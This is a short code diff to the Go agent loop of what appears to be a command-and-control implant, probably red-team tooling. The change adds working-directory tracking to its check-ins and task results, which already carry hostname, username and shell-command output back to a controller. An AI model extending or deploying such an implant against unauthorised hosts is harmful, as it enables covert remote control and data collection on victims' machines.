@@ -17,6 +17,7 @@ import (
 // Agent is the reference implant loop.
 type Agent struct {
 	ID        string
+	Cwd       string // host working directory for shell commands
 	Sleep     time.Duration
 	Transport *transport.HTTP
 	Log       *slog.Logger
@@ -31,6 +32,8 @@ func (a *Agent) Run(ctx context.Context) error {
 	if a.Sleep <= 0 {
 		a.Sleep = 5 * time.Second
 	}
+	a.ensureCwd()
+	a.Log.Info("working directory", "cwd", a.Cwd)
 
 	for {
 		if err := a.beat(ctx); err != nil {
@@ -52,6 +55,7 @@ func (a *Agent) beat(ctx context.Context) error {
 		username = accountName(u.Username, hostname)
 	}
 
+	a.ensureCwd()
 	resp, err := a.Transport.CheckIn(ctx, &agentv1.AgentCheckIn{
 		AgentId:      a.ID,
 		Hostname:     hostname,
@@ -59,6 +63,7 @@ func (a *Agent) beat(ctx context.Context) error {
 		Os:           runtime.GOOS,
 		Arch:         runtime.GOARCH,
 		SleepSeconds: uint64(a.Sleep / time.Second),
+		Cwd:          a.Cwd,
 	})
 	if err != nil {
 		return err
@@ -78,12 +83,14 @@ func (a *Agent) beat(ctx context.Context) error {
 
 	for _, t := range resp.GetTasks() {
 		exitCode, stdout, stderr := a.runTask(ctx, t)
+		a.ensureCwd()
 		_, err := a.Transport.PostResult(ctx, &agentv1.AgentTaskResult{
 			AgentId:  a.ID,
 			TaskId:   t.GetTaskId(),
 			ExitCode: exitCode,
 			Stdout:   stdout,
 			Stderr:   stderr,
+			Cwd:      a.Cwd,
 		})
 		if err != nil {
 			a.Log.Warn("post result failed", "task_id", t.GetTaskId(), "err", err)
